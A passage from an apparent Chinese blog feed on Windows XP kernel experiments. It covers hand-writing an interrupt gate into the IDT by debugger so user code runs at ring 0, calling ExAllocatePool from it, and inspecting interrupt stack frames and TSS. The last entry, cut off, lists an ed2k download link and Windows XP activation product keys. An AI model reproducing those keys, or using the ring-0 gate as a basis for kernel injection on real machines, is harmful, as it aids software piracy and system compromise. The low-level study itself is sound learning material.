BYTES</span><br><span class="line">.text:00469510</span><br><span class="line">.text:00469510 B9 23 00 00 00                mov     ecx, 23h ; &#x27;#&#x27;</span><br><span class="line">.text:00469515 6A 30                         push    30h ; &#x27;0&#x27;</span><br><span class="line">.text:00469517 0F A1                         pop     fs</span><br><span class="line">.text:00469519 8E D9                         mov     ds, ecx</span><br><span class="line">.text:0046951B 8E C1                         mov     es, ecx</span><br><span class="line">.text:0046951D 64 8B 0D 40 00 00 00          mov     ecx, large fs:40h</span><br><span class="line">.text:00469524 8B 61 04                      mov     esp, [ecx+4]</span><br><span class="line">.text:00469527 6A 23                         push    23h ; &#x27;#&#x27;</span><br><span class="line">.text:00469529 52                            push    edx</span><br><span class="line">.text:0046952A 9C                            pushf</span><br></pre></td></tr></table></figure><p>最主要的时fs寄存器,其余的ds es 和用户态是一样的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00469515</span> <span class="number">6</span>A <span class="number">30</span>                         push    <span class="number">30</span>h ; <span class="string">&#x27;0&#x27;</span></span><br><span class="line">.text:<span class="number">00469517</span> <span class="number">0F</span> A1                         pop     fs</span><br></pre></td></tr></table></figure><p>fs寄存器在内核模式下指向处理器控制区(KPCR)，选择子为30h。KPCR中存储了CPU本身要用的一些重要数据：GDT、IDT以及线程相关的一些信息</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    label:</span><br><span class="line">        jmp label</span><br><span class="line">           push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的话，时钟中断可以工作了，但是进程是杀不死的，关机也是关不了的，调试器接管去改掉这个循环就可以</p><blockquote><p>最后返回3环时要把fs再恢复</p></blockquote><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>目前的所学知识还不能解释太清楚KPCR，再等等</p><h2 id="API调用"><a href="#API调用" class="headerlink" title="API调用"></a>API调用</h2><p>有了上面的基础之后，我们就可以不太安全的调用内核函数了(不太安全是因为我们的内核环境构建不够完整，只构建了最基础的fs寄存器)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">PVOID</span> <span class="params">(__stdcall *EX_AllOCATEPOOl)</span><span class="params">(DWORD PoolType, SIZE_T NumberOfBytes)</span>;</span><br><span class="line">PVOID g_pointer;</span><br><span class="line">EX_AllOCATEPOOl ExAllocatePool=(EX_AllOCATEPOOl)<span class="number">0x80536FEC</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    &#125;</span><br><span class="line">    g_pointer=ExAllocatePool(<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>, g_pointer);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ExAllocatePool是驱动ntkrnplpa里一个导出函数,用于在内核模式下分配内存。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PVOID <span class="title function_">ExAllocatePool</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_ POOL_TYPE PoolType,</span></span><br><span class="line"><span class="params">  _In_ SIZE_T    NumberOfBytes</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li><code>PoolType</code>：指定内存池的类型，可以是<code>NonPagedPool</code>或<code>PagedPool</code>。<code>NonPagedPool</code>是非分页池，用于分配不能交换到磁盘的内存；<code>PagedPool</code>是分页池，用于分配可以交换到磁盘的内存。</li><li><code>NumberOfBytes</code>：指定要分配的内存大小（以字节为单位）。</li></ul><p><img src="/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/image-20230529210100412.png" alt="image-20230529210100412"></p><p><img src="/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/image-20230529211226588.png" alt="image-20230529211226588"></p><p>这样我们就有了内核注入的基础</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:中断现场(Interrupt Handling)</title>
      <link href="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/"/>
      <url>/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-中断现场-Interrupt-Handling"><a href="#Windows内核实验-中断现场-Interrupt-Handling" class="headerlink" title="Windows内核实验:中断现场(Interrupt Handling)"></a>Windows内核实验:中断现场(Interrupt Handling)</h1><p><strong>!!!windbg调试器给我们的信息可能是不准确的，中断断下来后，调试子系统需要通过串口发送给调试器，这期间有些寄存器的值就变了，比较准确的方法就是在r0里写汇编，返回给我们数据</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_eax[<span class="number">2</span>], g_ebx[<span class="number">2</span>], g_ecx[<span class="number">2</span>], g_edx[<span class="number">2</span>], g_esi[<span class="number">2</span>], g_edi[<span class="number">2</span>], g_esp[<span class="number">2</span>], g_ebp[<span class="number">2</span>];</span><br><span class="line">WORD g_cs[<span class="number">2</span>], g_ds[<span class="number">2</span>], g_es[<span class="number">2</span>], g_fs[<span class="number">2</span>], g_gs[<span class="number">2</span>], g_ss[<span class="number">2</span>];</span><br><span class="line">DWORD g_eflags,g_eflags0;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushfd</span><br><span class="line">        pop[g_eflags]</span><br><span class="line">        mov[g_eax + <span class="number">4</span>], eax</span><br><span class="line">        mov[g_ebx + <span class="number">4</span>], ebx</span><br><span class="line">        mov[g_ecx + <span class="number">4</span>], ecx</span><br><span class="line">        mov[g_edx + <span class="number">4</span>], edx</span><br><span class="line">        mov[g_esi + <span class="number">4</span>], esi</span><br><span class="line">        mov[g_edi + <span class="number">4</span>], edi</span><br><span class="line">        mov[g_esp + <span class="number">4</span>], esp</span><br><span class="line">        mov[g_ebp + <span class="number">4</span>], ebp</span><br><span class="line">        mov[g_cs + <span class="number">2</span>], cs</span><br><span class="line">        mov[g_ds + <span class="number">2</span>], ds</span><br><span class="line">        mov[g_es + <span class="number">2</span>], es</span><br><span class="line">        mov[g_fs + <span class="number">2</span>], fs</span><br><span class="line">        mov[g_gs + <span class="number">2</span>], gs</span><br><span class="line">        mov[g_ss + <span class="number">2</span>], ss</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushfd</span><br><span class="line">        pop [g_eflags0]</span><br><span class="line">        mov[g_eax], eax</span><br><span class="line">        mov[g_ebx], ebx</span><br><span class="line">        mov[g_ecx], ecx</span><br><span class="line">        mov[g_edx], edx</span><br><span class="line">        mov[g_esi], esi</span><br><span class="line">        mov[g_edi], edi</span><br><span class="line">        mov[g_esp], esp</span><br><span class="line">        mov[g_ebp], ebp</span><br><span class="line">        mov[g_cs], cs</span><br><span class="line">        mov[g_ds], ds</span><br><span class="line">        mov[g_es], es</span><br><span class="line">        mov[g_fs], fs</span><br><span class="line">        mov[g_gs], gs</span><br><span class="line">        mov[g_ss], ss</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;eax:%x\t ebx:%x\t ecx:%x\t edx:%x\t esi:%x\t edi:%x\t esp:%x\t ebp:%x\t\n&quot;</span>,</span><br><span class="line">        g_eax[<span class="number">0</span>], g_ebx[<span class="number">0</span>], g_ecx[<span class="number">0</span>], g_edx[<span class="number">0</span>], g_esi[<span class="number">0</span>], g_edi[<span class="number">0</span>], g_esp[<span class="number">0</span>], g_ebp[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;eax:%x\t ebx:%x\t ecx:%x\t edx:%x\t esi:%x\t edi:%x\t esp:%x\t ebp:%x\t\n&quot;</span>,</span><br><span class="line">        g_eax[<span class="number">1</span>], g_ebx[<span class="number">1</span>], g_ecx[<span class="number">1</span>], g_edx[<span class="number">1</span>], g_esi[<span class="number">1</span>], g_edi[<span class="number">1</span>], g_esp[<span class="number">1</span>], g_ebp[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs:%x\t ds:%x\t es:%x\t fs:%x\t gs:%x\t ss:%x\t\n&quot;</span>,</span><br><span class="line">        g_cs[<span class="number">0</span>], g_ds[<span class="number">0</span>], g_es[<span class="number">0</span>], g_fs[<span class="number">0</span>], g_gs[<span class="number">0</span>], g_ss[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs:%x\t ds:%x\t es:%x\t fs:%x\t gs:%x\t ss:%x\t\n&quot;</span>,</span><br><span class="line">        g_cs[<span class="number">1</span>], g_ds[<span class="number">1</span>], g_es[<span class="number">1</span>], g_fs[<span class="number">1</span>], g_gs[<span class="number">1</span>], g_ss[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;efalgs0:0x%x\nefalgs0x%x&quot;</span>,g_eflags0,g_eflags);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">eax:<span class="number">401040</span>       ebx:<span class="number">7f</span>fd9000    ecx:b2ede300    edx:<span class="number">7</span>c92eb94    esi:<span class="number">419</span>cf0</span><br><span class="line"> edi:<span class="number">154</span>d58      esp:<span class="number">12f</span>f7c      ebp:<span class="number">12f</span>fc0</span><br><span class="line">eax:<span class="number">401040</span>       ebx:<span class="number">7f</span>fd9000    ecx:b2ede300    edx:<span class="number">7</span>c92eb94    esi:<span class="number">419</span>cf0</span><br><span class="line"> edi:<span class="number">154</span>d58      esp:b2cdfdcc    ebp:<span class="number">12f</span>fc0</span><br><span class="line">cs:<span class="number">1b</span>    ds:<span class="number">23</span>   es:<span class="number">23</span>   fs:<span class="number">3b</span>   gs:<span class="number">0</span>    ss:<span class="number">23</span></span><br><span class="line">cs:<span class="number">8</span>     ds:<span class="number">23</span>   es:<span class="number">23</span>   fs:<span class="number">3b</span>   gs:<span class="number">0</span>    ss:<span class="number">10</span></span><br><span class="line">efalgs0:<span class="number">0x246</span></span><br><span class="line">efalgs0x46</span><br></pre></td></tr></table></figure><p>中断前后变得只有，eflags:0x246–&gt;0x46  esp:12ff7c-&gt;b2d13dcc  cs:1b–&gt;8 ss:23–&gt;10</p><p>1b(0001 1011) –&gt; 8(1000)</p><p>23(0010 0011) –&gt; 10(0001 0000)</p><h3 id="ds为什么还是23，没有提升到内核"><a href="#ds为什么还是23，没有提升到内核" class="headerlink" title="ds为什么还是23，没有提升到内核?"></a><strong>ds为什么还是23，没有提升到内核?</strong></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dg <span class="number">23</span></span><br><span class="line">                                  P Si Gr Pr Lo</span><br><span class="line">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class="line">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0023</span> <span class="number">00000000</span> ffffffff Data RW Ac <span class="number">3</span> Bg Pg P  Nl <span class="number">00000</span>cf3</span><br></pre></td></tr></table></figure><p>可以看到ds是一个平坦段，可以访问整个4gb，分段保护机制其实是在弱化，只是提供了进程隔离，具体访问保护是由分页机制来提供的</p><h3 id="eflags变化"><a href="#eflags变化" class="headerlink" title="eflags变化?"></a><strong>eflags变化?</strong></h3><p>第九位变为0了，也就是IF位置零，中断处理过程关中断</p><h3 id="cs段选择子为什么会是8？"><a href="#cs段选择子为什么会是8？" class="headerlink" title="cs段选择子为什么会是8？"></a><strong>cs段选择子为什么会是8？</strong></h3><p>和我们构造的<strong>中断门</strong>有关系 他的16-31位为中断处理程序目标代码段选择子 即为下面的0008</p><p>eq 8003f500  0040ee00&#96;00081040</p><p>dg x命令显示段选择子x所指向的段描述符</p><h3 id="ss和sp是怎么来的呢？"><a href="#ss和sp是怎么来的呢？" class="headerlink" title="ss和sp是怎么来的呢？"></a><strong>ss和sp是怎么来的呢？</strong></h3><p>从tss段里取出来的，TR寄存器中存放着指向当前任务TSS段的段选择子</p><p>str [g_tr] 把当前任务（任务状态段TSS）的选择器存储到指定的位置上看下是0x28 右移3位所以是gdt表第5个即为tss段描述符</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528174545899.png" alt="image-20230528174545899"></p><p>TYPE的B是指任务是否处于忙状态(当前正在执行或被挂起等待执行)，忙为1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">8003f</span>000</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>000+<span class="number">8</span>*<span class="number">5</span> l1</span><br><span class="line"><span class="number">8003f</span>028  <span class="number">80008b</span>04`<span class="number">200020</span>ab</span><br></pre></td></tr></table></figure><p>type为1011</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528172940147.png" alt="image-20230528172940147"></p><p>这个基地址就是任务状态段TSS(Task state segment)所在处，即为下面的结构</p><p>其中红色的叫做静态字段，在任务创建是设置，一般不会改变</p><p>绿色的叫做动态字段，时常更新</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528175556760.png" alt="image-20230528175556760"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_eax[<span class="number">2</span>], g_ebx[<span class="number">2</span>], g_ecx[<span class="number">2</span>], g_edx[<span class="number">2</span>], g_esi[<span class="number">2</span>], g_edi[<span class="number">2</span>], g_esp[<span class="number">2</span>], g_ebp[<span class="number">2</span>];</span><br><span class="line">WORD g_cs[<span class="number">2</span>], g_ds[<span class="number">2</span>], g_es[<span class="number">2</span>], g_fs[<span class="number">2</span>], g_gs[<span class="number">2</span>], g_ss[<span class="number">2</span>];</span><br><span class="line">WORD g_tr;</span><br><span class="line">DWORD g_80042004, g_80042008;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov[g_esp], esp</span><br><span class="line">        mov[g_ss], ss</span><br><span class="line">        mov eax, ds:[<span class="number">0x80042004</span>]</span><br><span class="line">        mov[g_80042004], eax</span><br><span class="line">        mov eax, ds:[<span class="number">0x80042008</span>]</span><br><span class="line">        mov[g_80042008],eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;esp: 0x%x\tss: 0x%x\n&quot;</span>, g_esp[<span class="number">0</span>], g_ss[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;esp0: 0x%x\tss0: 0x%hx&quot;</span>,g_80042004,g_80042008);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">esp:  <span class="number">0xb29d3dcc</span>         ss: <span class="number">0x10</span></span><br><span class="line">esp0: <span class="number">0xb29d3de0</span>        ss0: <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>可以验证到，就是从tss里面去取内核栈</p><h3 id="为什么esp栈顶提升了0x14，栈里压了5个什么"><a href="#为什么esp栈顶提升了0x14，栈里压了5个什么" class="headerlink" title="为什么esp栈顶提升了0x14，栈里压了5个什么"></a><strong>为什么esp栈顶提升了0x14，栈里压了5个什么</strong></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_eax[<span class="number">2</span>], g_ebx[<span class="number">2</span>], g_ecx[<span class="number">2</span>], g_edx[<span class="number">2</span>], g_esi[<span class="number">2</span>], g_edi[<span class="number">2</span>], g_esp[<span class="number">2</span>], g_ebp[<span class="number">2</span>];</span><br><span class="line">WORD g_cs[<span class="number">2</span>], g_ds[<span class="number">2</span>], g_es[<span class="number">2</span>], g_fs[<span class="number">2</span>], g_gs[<span class="number">2</span>], g_ss[<span class="number">2</span>];</span><br><span class="line">DWORD g_eflags;</span><br><span class="line">DWORD g_stack[<span class="number">5</span>];</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, dword ptr ss:[esp]</span><br><span class="line">        mov dword ptr [g_stack], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">4</span>]</span><br><span class="line">        mov dword ptr [g_stack + <span class="number">4</span>], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">8</span>]</span><br><span class="line">        mov dword ptr [g_stack + <span class="number">8</span>], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">12</span>]</span><br><span class="line">        mov dword ptr [g_stack +<span class="number">12</span>], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">16</span>]</span><br><span class="line">        mov dword ptr [g_stack+<span class="number">16</span>], eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushfd</span><br><span class="line">        pop [g_eflags]</span><br><span class="line">        mov [g_ss],ss</span><br><span class="line">        mov [g_esp],esp</span><br><span class="line">        mov [g_cs],cs</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs: 0x%x\teflags: 0x%hx\t&quot;</span>,g_cs[<span class="number">0</span>],g_eflags);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;esp: 0x%x\tss: 0x%x\n&quot;</span>, g_esp[<span class="number">0</span>], g_ss[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;stack[%d]:0x%x\n&quot;</span>,i,g_stack[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cs: <span class="number">0x1b</span>        eflags: <span class="number">0x246</span>   esp: <span class="number">0x12ff78</span>   ss: <span class="number">0x23</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">0</span>]:<span class="number">0x4010aa</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">1</span>]:<span class="number">0x1b</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">2</span>]:<span class="number">0x246</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">3</span>]:<span class="number">0x12ff78</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">4</span>]:<span class="number">0x23</span></span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><p>栈里第一个是返回地址，后面分别是三环的cs eflags esp ss，和之前理论是一样的(出错码是可选的)，iret时会弹出来</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528225918572.png" alt="image-20230528225918572"></p><blockquote><p>栈顶的返回地址怎么来调试验证?</p><p>直接在IdtEntry里写上int3 ，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">3</span></span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push eax</span><br><span class="line">        pop eax</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不挂调试器会报错，挂了调试器会在int3处断下来</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">00401040 cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r esp</span></span><br><span class="line">esp=b2cf3dcc</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dps b2cf3dcc l5</span></span><br><span class="line">b2cf3dcc  00401061</span><br><span class="line">b2cf3dd0  0000001b</span><br><span class="line">b2cf3dd4  00000246</span><br><span class="line">b2cf3dd8  0012ff78</span><br><span class="line">b2cf3ddc  00000023</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">ub 00401061 l4</span></span><br><span class="line">0040105b 756d            jne     004010ca</span><br><span class="line">0040105d 50              push    eax</span><br><span class="line">0040105e 58              pop     eax</span><br><span class="line">0040105f cd20            int     20h</span><br></pre></td></tr></table></figure><p>返回地址确实是int  20h中断后的下一条指令</p></blockquote><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230527235756049.png" alt="image-20230527235756049"></p><p>cs和ss选择子的RPL(CPL)都变为0，代表当前正在执行的程序或任务的特权级别为内核权限</p><p>windbg</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r gdtr</span></span><br><span class="line">gdtr=8003f000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r gdtl</span></span><br><span class="line">gdtl=000003ff</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq 8003f000 l20</span></span><br><span class="line">8003f000  00000000`00000000 00cf9b00`0000ffff</span><br><span class="line">8003f010  00cf9300`0000ffff 00cffb00`0000ffff</span><br><span class="line">8003f020  00cff300`0000ffff 80008b04`200020ab</span><br><span class="line">8003f030  ffc093df`f0000001 0040f300`00000fff</span><br><span class="line">8003f040  0000f200`0400ffff 00000000`00000000</span><br><span class="line">8003f050  80008955`17000068 80008955`17680068</span><br><span class="line">8003f060  00009302`2f30ffff 0000920b`80003fff</span><br><span class="line">8003f070  ff0092ff`700003ff 80009a40`0000ffff</span><br><span class="line">8003f080  80009240`0000ffff 00009200`00000000</span><br><span class="line">8003f090  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0a0  8200891e`a9400068 00000000`00000000</span><br><span class="line">8003f0b0  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0c0  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0d0  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0e0  f8009f71`a000ffff 00009200`0000ffff</span><br><span class="line">8003f0f0  8000984f`ccd403b7 00009200`0000ffff</span><br></pre></td></tr></table></figure><blockquote><p>GDT中第一个表项（0号）的描述符保留不用，称为空描述符</p></blockquote><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528001616020.png" alt="image-20230528001616020"></p><p>按照上图解析</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528001515527.png" alt="image-20230528001515527"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:中断提权(Interrupt Privilege Escalation)</title>
      <link href="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/"/>
      <url>/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-中断提权-Interrupt-Privilege-Escalation"><a href="#Windows内核实验-中断提权-Interrupt-Privilege-Escalation" class="headerlink" title="Windows内核实验:中断提权(Interrupt Privilege Escalation)"></a>Windows内核实验:中断提权(Interrupt Privilege Escalation)</h1><h2 id="双机调试环境搭建"><a href="#双机调试环境搭建" class="headerlink" title="双机调试环境搭建"></a>双机调试环境搭建</h2><p>从32位的xp开始，慢慢上64位</p><p>Windows XP Home Edition with Service Pack 2 (Simplified Chinese) </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ed2k:<span class="comment">//|file|sc_winxp_home_with_sp2.iso|61135872    0|B80F4CCF312420015FFD5740057085B0|/</span></span><br></pre></td></tr></table></figure><p>Home Edition with Service Pack 2  xp激活码 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span>QKF3-VDWXY-CT6TM<span class="number">-7</span>TGG6-GKR9G</span><br></pre></td></tr></table></figure><p>Windows XP Professional with Service Pack 2 (Simplified Chinese激活码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BB96V<span class="number">-433</span>XK-GM9WR-KXCDJ<span class="number">-4</span>HTQW</span><br></pre></td></tr></table></figure><p>zh-hans_windows_xp_professional_with_service_pack_3_x86_cd</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MRX3F<span class="number">-47B</span>9T<span class="number">-2487</span>J-KWKMF-RPWBY</span><br><span 